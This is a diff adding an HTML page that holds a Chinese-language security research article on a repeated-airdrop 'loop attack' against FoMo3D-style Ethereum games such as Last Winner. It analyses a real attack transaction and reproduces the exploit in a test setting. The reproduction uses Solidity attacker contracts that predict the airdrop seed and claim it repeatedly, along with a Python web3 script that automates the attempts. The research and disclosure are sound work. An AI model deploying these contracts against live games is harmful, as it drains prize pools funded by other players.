@@ -1,0 +1,437 @@
+<!DOCTYPE HTML>
+<html>
+ <head>
+  <meta charset="utf-8"/>
+  <title>
+   Made with Remarkable!
+  </title>
+  <link href="http://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.1/styles/github.min.css" rel="stylesheet"/>
+  <style type="text/css">
+   ::selection,a::selection{background:rgba(255,255,0,.3)}a,a::selection{color:#0645ad}hr,img{border:0}a,ins{text-decoration:none}::selection,ins,mark{color:#000}dfn,mark{font-style:italic}hr,ol,p,ul{margin:1em 0}table tr td,table tr th{border:1px solid #ccc;text-align:left;padding:6px 13px;margin:0}hr,pre code,table,table tr{padding:0}pre,pre code{white-space:pre}html{font-size:100%;overflow-y:scroll;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%}body{color:#444;font-family:Georgia,Palatino,"Palatino Linotype",Times,"Times New Roman",serif;font-size:12px;line-height:1.5em;padding:1em;margin:auto;max-width:42em;background:#fefefe}a:visited{color:#0b0080}a:hover{color:#06e}a:active{color:#faa700}a:focus{outline:dotted thin}a:active,a:hover{outline:0}::-moz-selection{background:rgba(255,255,0,.3);color:#000}a::-moz-selection{background:rgba(255,255,0,.3);color:#0645ad}img{max-width:100%;-ms-interpolation-mode:bicubic;vertical-align:middle}h1,h2,h3,h4,h5,h6{font-weight:400;color:#111;line-height:1em}b,h4,h5,h6,mark,strong,table tr th{font-weight:700}h1{font-size:2.5em}h2{font-size:2em}h3{font-size:1.5em}h4{font-size:1.2em}h5{font-size:1em}h6{font-size:.9em}blockquote{color:#666;margin:0;padding-left:3em;border-left:.5em #EEE solid}hr{display:block;height:2px;border-top:1px solid #aaa;border-bottom:1px solid #eee}code,kbd,pre,samp{color:#000;font-family:monospace,monospace;font-size:.98em}pre{white-space:pre-wrap;word-wrap:break-word}ins{background:#ff9}mark{background:#ff0}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sup{top:-.5em}sub{bottom:-.25em}ol,ul{padding:0 0 0 2em}li p:last-child{margin:0}dd{margin:0 0 0 2em}table{border-collapse:collapse;border-spacing:0}td{vertical-align:top}@media only screen and (min-width:480px){body{font-size:14px}}@media only screen and (min-width:768px){body{font-size:16px}}@media print{blockquote,img,pre,tr{page-break-inside:avoid}*{background:0 0!important;color:#000!important;filter:none!important;-ms-filter:none!important}body{font-size:12pt;max-width:100%}a,a:visited{text-decoration:underline}hr{height:1px;border:0;border-bottom:1px solid #000}a[href]:after{content:" (" attr(href) ")"}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}blockquote,pre{border:1px solid #999;padding-right:1em}img{max-width:100%!important}@page :left{margin:15mm 20mm 15mm 10mm}@page :right{margin:15mm 10mm 15mm 20mm}h2,h3,p{orphans:3;widows:3}h2,h3{page-break-after:avoid}}table tr{border-top:1px solid #ccc;background-color:#fff;margin:0}table tr:nth-child(2n){background-color:#aaa}table tr td :first-child,table tr th :first-child{margin-top:0}table tr td:last-child,table tr th :last-child{margin-bottom:0}code,tt{margin:0 2px;padding:0 5px;white-space:nowrap;border:1px solid #eaeaea;background-color:#f8f8f8;border-radius:3px}pre code{margin:0;border:none;background:0 0}.highlight pre,pre{background-color:#f8f8f8;border:1px solid #ccc;font-size:13px;line-height:19px;overflow:auto;padding:6px 10px;border-radius:3px}
+  </style>
+ </head>
+ <body>
+  <h1 id="fomo3d">
+   类FoMo3D空投漏洞之循环攻击
+  </h1>
+  <h2 id="_1">
+   零、前言
+  </h2>
+  <p>
+   前一段时间我们针对类fomo3d游戏做了简单的介绍，披露了类fomo3d游戏中的空投漏洞，并对漏洞以及攻击代码做了复现。随着进一步的研究，我们发现攻击者升级了攻击方法，该攻击方法比之前的攻击方法更有效。通过获得特殊的合约地址，能多次获得空投奖励。
+  </p>
+  <h2 id="_2">
+   一、前情简介
+  </h2>
+  <p>
+   在类fomo3d游戏中每一次投入金额超过0.1ETH(这个具体数值不同的类fomo3d游戏可能不同)便有几率获得一次空投奖励,游戏通过下面这个
+   <code>
+    airdrop()
+   </code>
+   函数判断是否能获得空投奖励。
+  </p>
+  <pre><code>contnract Fomo3Dlong {
+...... 
+    function airdrop()
+        private 
+        view 
+        returns(bool)
+    {
+        uint256 seed = uint256(keccak256(abi.encodePacked(
+
+            (block.timestamp).add
+            (block.difficulty).add
+            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add
+            (block.gaslimit).add
+            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add
+            (block.number)
+
+        )));
+        if((seed - ((seed / 1000) * 1000)) &lt; airDropTracker_)
+            return(true);
+        else
+            return(false);
+    }
+......
+}
+</code></pre>
+  <pre><code>contract Fomo3Dlong {
+......
+   function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)
+        private
+    {
+    ......
+            // manage airdrops
+            if (_eth &gt;= 100000000000000000)
+            {
+            airDropTracker_++;
+            if (airdrop() == true)
+            {
+                ......
+                // reset air drop tracker
+                airDropTracker_ = 0;
+            }
+            }
+     }
+......
+}
+
+</code></pre>
+  <p>
+   空投机制有些类似于挖矿，将交易发送者的地址和区块的一些信息放在一起做一些运算，计算出
+   <code>
+    seed
+   </code>
+   (与购买的seed无关)，如果
+   <code>
+    seed
+   </code>
+   对1000求余后小于
+   <code>
+    airDropTracker_
+   </code>
+   ,那么就满足获得空投的条件，那么获得空投的概率相当于是千分之
+   <code>
+    airDropTrakcer_
+   </code>
+   ,每笔金额超过0.1ETH的购买
+   <code>
+    seed
+   </code>
+   的交易会使
+   <code>
+    airDropTracker_
+   </code>
+   自增，从而增大后面玩家获得空投的概率，而若有玩家获得空投，则将
+   <code>
+    airDropTracker_
+   </code>
+   归零，重置获得空投的概率。
+  </p>
+  <p>
+   我们上一篇文章谈到，有一些骇客通过部署智能合约可以提前获知自己能否获得空投，能够做到每笔购买seed的交易都获得空投，不少骇客从中获利良多。随着8月22号fomo3d第一轮游戏因DoS攻击结束，这类游戏的活跃程度大不如前，但是瘦死的骆驼比马大，那些骇客仍然在不断的更新攻击合约，以期缩减攻击成本，获得更多利润，本文接下来就详细地介绍一下升级之后的攻击方法。
+  </p>
+  <h2 id="_3">
+   二、循环攻击
+  </h2>
+  <h3 id="20">
+   2.0 现场还原
+  </h3>
+  <p>
+   <img alt="steal_airdrop" src="./steal_airdrop_meitu.jpg"/>
+   <br/>
+   <a href="https://etherscan.io/tx/0x157cdcd345ad99b54b67a0568eeaf82ae216bfe42c2a7070ec96295793e4613e">
+    0x157cdcd345ad99b54b67a0568eeaf82ae216bfe42c2a7070ec96295793e4613e
+   </a>
+  </p>
+  <p>
+   我们还是先从一笔真实的交易开始，上面这笔交易有着超长的内部交易列表，仔细分析之后，发现它的前面部分和我们上一篇文章中分析的漏洞利用过程如出一辙，通过一个manager来选择一个满足要求的proxy_n,然后proxy_n再去部署
+   <code>
+    final_call
+   </code>
+   ,
+   <code>
+    final_call
+   </code>
+   的
+   <code>
+    construcotr
+   </code>
+   中包含了向类fomo3d游戏购买seed的逻辑，这笔交易的攻击对象是Last Winner, 这款游戏由于将空投奖池的占比从FoMo3D的1%提高到了10%，所以获得骇客的青睐也是情有可原。这笔交易和我们上一篇文章中分析的攻击手段不同的地方在于它的
+   <code>
+    final_call
+   </code>
+   连续购买多次seed，反复的获取空投，最后快没有利润的时候才停手自毁将eth转回攻击者。
+  </p>
+  <p>
+   我们仔细的去研究了一下
+   <a href="http://lastwinner.me/guide.html">
+    Last Winner 的规则
+   </a>
+   ,发现它不仅改了空投池的占比，而且将每笔购买金额在0.1~1ETH的交易所获得的空投奖励比例下降为10%。
+   <br/>
+   <img alt="count_airdrop" src="./conut_airdrop.png"/>
+  </p>
+  <p>
+   考虑到solidity除法截断的误差，我们计算出的每一比空投奖励数值基本上与这笔交易是吻合的。那么问题来了，根据类FoMo3D游戏的规则，一旦有人获得了空投，
+   <code>
+    airDropTracker_
+   </code>
+   将会归零，骇客为什么能在一笔交易中反复的获得空投？我们回过头又仔细看了一下FoMo3D的源码，发现原来
+   <code>
+    airDropTracker_
+   </code>
+   自增发生在判定空投
+   <code>
+    airdrop()
+   </code>
+   的前面，也就是说
+   <code>
+    airDropTracker_
+   </code>
+   归零之后下一玩家只要购买金额超过0.1ETH仍然有千分之一的几率获得空投奖励。这样看来这笔交易中的
+   <code>
+    final_call
+   </code>
+   是一个满足了更加苛刻的条件的临时合约，即用
+   <code>
+    final_call
+   </code>
+   的地址计算出来的
+   <code>
+    seed
+   </code>
+   必须是0, 1000, 2000等一千的整数倍(或零倍)，我们接下来在之前的代码的基础上做一些修改来复现一下该过程。
+  </p>
+  <h3 id="21">
+   2.1 攻击复现
+  </h3>
+  <pre><code>contract final_call_infinite {
+
+    constructor(address attackee) payable public {
+        for (uint8 i = 0; i &lt; 10; i++) {
+
+            if (attackee.call.value(1000000000000000)(abi.encode(bytes4(keccak256("can_i_jump()")))) == false) {
+                revert();
+
+            }
+        }
+    }
+}
+contract proxy {
+
+    function attack(address attackee) public payable {
+        (new final_call).value(100000000000000000)(attackee);
+    }
+
+    function attack_infinite(address attackee) public payable {
+
+        (new final_call_infinite).value(100000000000000000)(attackee);
+    }
+}
+</code></pre>
+  <p>
+   首先增加一个
+   <code>
+    final_call_infinite
+   </code>
+   的临时合约，使其可以循环的发起攻击，然后在合约
+   <code>
+    proxy
+   </code>
+   下增加一个
+   <code>
+    attack_infinite()
+   </code>
+   函数用于创建
+   <code>
+    final_call_infinite
+   </code>
+   合约。
+  </p>
+  <pre><code>contract manager {
+......
+    address[] private _proxy = new address[](1000);
+    uint[] private _nonce = new uint[](1000);
+......
+    function attack(address attackee, uint airDropTracker_) isMe public payable {
+        for (uint64 i = 0; i &lt; 1000; i++) {
+
+            address proxy_address = _proxy[i];
+            uint proxy_nonce = _nonce[i] + 1;
+            if (fake_airdrop(count_next_address(proxy_address, proxy_nonce), 1)) {
+                if (proxy_address.call.value(100000000000000000)(abi.encodeWithSelector(bytes4(keccak256("attack_infinite(address)")), attackee)) == false) {
+                    revert();
+                }
+                _nonce[i] ++;
+
+                return;
+            }
+        }
+
+        for (uint64 i = 0; i &lt; 1000; i++) {
+
+            address proxy_address = _proxy[i];
+            uint proxy_nonce = _nonce[i] + 1;
+            if (fake_airdrop(count_next_address(proxy_address, proxy_nonce), airDropTracker_)) {
+                if (proxy_address.call.value(100000000000000000)(abi.encodeWithSelector(bytes4(keccak256("attack(address)")), attackee)) == false) {
+                    // These code will not be executed, even though call fail.
+                    revert();
+                }
+                _nonce[i] ++;
+
+                return;
+            }
+        }
+    }
+......
+}
+</code></pre>
+  <p>
+   由于这次的筛选要求非常苛刻，所以我们将proxy的数组扩大到1000， 增多备选的proxy; 然后我们修改了manager的
+   <code>
+    attack()
+   </code>
+   函数，让其优先寻找满足
+   <code>
+    fake_airdrop(count_next_address(proxy_address, proxy_nonce), 1))
+   </code>
+   的proxy。
+  </p>
+  <pre><code>contract Airdrop{
+......
+    function can_i_jump() public payable {
+
+        airDropTracker_ ++;
+        if (_airdrop()) {
+            jump_time ++;
+            emit record(msg.sender, jump_times, airDropTracker_);
+
+            airDropTracker_ = 0;
+        } else {
+
+            emit record(msg.sender, jump_times, airDropTracker_);
+        }
+    }
+......
+}
+</code></pre>
+  <p>
+   我们也略微修改了靶子的代码，将
+   <code>
+    is_jump
+   </code>
+   改成
+   <code>
+    jump_time
+   </code>
+   来计算靶子一次交易中被攻击了几次，然后还增加了
+   <code>
+    airDropTracker_
+   </code>
+   自增和归零的逻辑，并将
+   <code>
+    airDropTracker_
+   </code>
+   加入了event记录起来。
+   <br/>
+   由于这次的攻击偶然性很大，可能需要多次的试探，所以我们通过脚本实现自动的重复攻击，下面的是脚本主要的逻辑。
+  </p>
+  <pre><code>def main():
+    print("mining...")
+    args = get_arguments()
+    w3 = connect_to_blockchain_through_ipc(args.ipc_path)
+    w3.miner.start(10)
+    print("Now, let's deploy attacker contract")
+    attacker = deploy_contract_on_blockchain(w3, get_bytecode(args.attacker_contract_source_path, args.attacker_main_contract), args.from_address_seq, args.value, args.gas_limit)
+    print("Now, let's deploy target contract")
+    target = deploy_contract_on_blockchain(w3, get_bytecode(args.target_contract_source_path, args.target_main_contract), args.from_address_seq, args.value, args.gas_limit)
+    initialization(w3, args.from_address_seq, attacker, args.gas_limit)
+    tx_hash = attack(w3, args.from_address_seq, attacker, target, args.gas_limit)
+    print("The final transaction hash is " +  tx_hash)
+    w3.miner.stop()
+    print("mining stop")
+
+
+def attack(w3, from_address_seq, attacker, target, gas_limit):
+
+    print("Now, let's attack the target\n ")
+
+    attack_time = 1
+    while get_jump_time(w3, from_address_seq, target) &lt;= 1:
+        print("Reset, let's start the number " + str(attack_time) + "th attack")
+        txhash1 = reset(w3, from_address_seq, target)
+        is_valid(w3, txhash1)
+        txhash2 = call_attack(w3, from_address_seq, attacker, target, gas_limit)
+        is_valid(w3, txhash2)
+        attack_time += 1
+
+    print("Success!")
+    return txhash2
+
+
+def initialization(w3, from_address_seq, attacker, gas_limit):
+
+    initialization_fs = "0xf73baf62"
+
+    print("Now, let's initialize the one thousand proxy contract")
+    for i in range(100):
+        print(str(i) + "th initialization")
+        txhash = "0x" + binascii.hexlify(w3.personal.sendTransaction({'from': w3.eth.accounts[from_address_seq], 'to': attacker, 'data': initialization_fs, 'gas': gas_limit}, " ")).decode()
+        #is_valid(w3, txhash)
+
+    is_valid(w3, txhash)
+
+    seq = get_seq(w3, from_address_seq, attacker)
+    if seq &lt; 1000:
+        print("mining stop")
+        w3.miner.stop()
+        raise Exception("The number of proxy must be 1000 intead of %d" % seq)
+
+
+</code></pre>
+  <p>
+   首先部署合约manager 和 target ， 然后调用100次manager的
+   <code>
+    proxy_initialization
+   </code>
+   初始化1000个proxy合约，然后就开始反复的对target发起攻击，若
+   <code>
+    jump_time
+   </code>
+   &lt;= 1说明没有成功地创建合约
+   <code>
+    final_call_infinite
+   </code>
+   进行攻击，否则成功。下面我们看具体的攻击流程
+  </p>
+  <p>
+   <img alt="attack_process" src="attack_process_meitu.jpg"/>
+  </p>
+  <p>
+   比较幸运，仅攻击了一次就成功了，我们来看一下这笔交易的receipt。
+  </p>
+  <p>
+   <img alt="receipt_1" src="receipt_1_meitu.jpg"/>
+   <br/>
+   <img alt="receipt_2" src="receipt_2_meitu.jpg"/>
+   <br/>
+   <img alt="receipt_3" src="receipt_3_meitu.jpg"/>
+  </p>
+  <p>
+   几个event完整的将攻击过程记录在了log中，大约是第224个proxy合约通过了
+   <code>
+    fakeairdrop(nextaddress, 1)
+   </code>
+   ，然后部署出
+   <code>
+    final_call_infinite
+   </code>
+   向target发起攻击，第一次
+   <code>
+    airDropTracker_
+   </code>
+   是101，之后九次都是1，而
+   <code>
+    jump_time
+   </code>
+   也从0增长到了10，复现成功。
+  </p>
+  <h3 id="22">
+   2.2 小结
+  </h3>
+  <p>
+   升级版的空投攻击在原理上与之前的并没有任何不同，只是做了些许优化，但是确实大大缩减了成本，付一笔交易的gas效果相当于之前的十几笔。也反映了这些骇客攻击手段正在不断地进步。
+  </p>
+  <script src="http://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.1/highlight.min.js">
+  </script>
+  <script>
+   hljs.initHighlightingOnLoad();
+  </script>
+  <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   MathJax.Hub.Config({"showProcessingMessages" : false,"messageStyle" : "none","tex2jax": { inlineMath: [ [ "$", "$" ] ] }});
+  </script>
+ </body>
+</html>
